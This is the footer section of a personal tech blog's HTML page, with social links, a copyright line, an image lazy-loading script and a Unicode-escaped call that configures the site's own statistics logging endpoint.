        <div class="card-footer">
          <span class="card-read-more">READ MORE</span>
        </div>
      </div>
    
  </a>
</article>

    
  </div>
</section>




  </main>
  
  <footer class="site-footer">
  <div class="footer-inner">
    <div class="footer-social">
      
        
          
            <a href="https://github.com/evilsocket" class="social-link" target="_blank" rel="noopener" aria-label="GitHub">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
            </a>
          
        
          
            <a href="https://twitter.com/evilsocket" class="social-link" target="_blank" rel="noopener" aria-label="Twitter">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
            </a>
          
        
          
            <a href="http://it.linkedin.com/in/simonemargaritelli/" class="social-link" target="_blank" rel="noopener" aria-label="LinkedIn">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
            </a>
          
        
          
        
          
            <a href="mailto:evilsocket@gmail.com" class="social-link" aria-label="Email">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
            </a>
          
        
      
    </div>
    <p class="footer-copyright">
      &copy; 2026 evilsocket. 
      Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>.
    </p>
  </div>
</footer>

  <script src="/a.js"></script>
<script type="text/javascript">
  A['\u0069\u006E\u0069\u0074']({ '\u0061\u0063\u0074\u0069\u006F\u006E': 'none', "statsEndpoint": "\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u006E\u006F\u0062\u006F\u0074\u002D\u0073\u0074\u0061\u0074\u0073\u002E\u0065\u0076\u0069\u006C\u0073\u006F\u0063\u006B\u0065\u0074\u002E\u0077\u006F\u0072\u006B\u0065\u0072\u0073\u002E\u0064\u0065\u0076\u002F\u006C\u006F\u0067" });
</script>

<!-- Minimal JS - no external dependencies needed -->
<script>
  // Lazy load images
  document.addEventListener('DOMContentLoaded', function () {
    var images = document.querySelectorAll('.card-image[data-bg]');
    images.forEach(function (img) {
      img.style.backgroundImage = 'url(' + img.dataset.bg + ')';
    });
  });
</script>
</body>
</html>
